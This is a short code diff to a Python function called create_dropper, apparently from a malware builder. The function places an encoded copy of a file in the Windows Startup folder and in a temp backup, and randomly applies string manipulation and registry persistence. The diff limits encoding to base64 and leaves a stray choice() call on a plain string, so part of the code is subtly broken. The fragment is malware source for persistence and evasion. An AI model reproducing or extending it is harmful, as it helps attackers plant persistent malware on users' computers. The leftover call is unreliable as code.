@@ -60,14 +60,9 @@ def create_dropper():
                                 f"appdata/roaming/microsoft/" \
                                 f"windows/start menu/programs/startup/{obfuscated_file_name}'"
     backup_of_file = f"'c:/users/{os.getlogin()}/appdata/local/temp/{obfuscated_file_name}'"
-    types_of_encoding = ["b64decode","a85decode","b85decode"]
+    types_of_encoding = "b64decode"
     type_of_encoding = choice(types_of_encoding)
-    if type_of_encoding == 'b64decode':
-        our_encoded_file = base64_encode_file(current_file)
-    elif type_of_encoding == 'a85decode':
-        our_encoded_file = a85_encode_file(current_file)
-    else:
-        our_encoded_file = base85_encode_file(current_file)
+    our_encoded_file = base64_encode_file(current_file)
     manipulation_types = ['reverse','replace']
     should_registry = choice([True,False])
     manipulate = choice(manipulation_types)
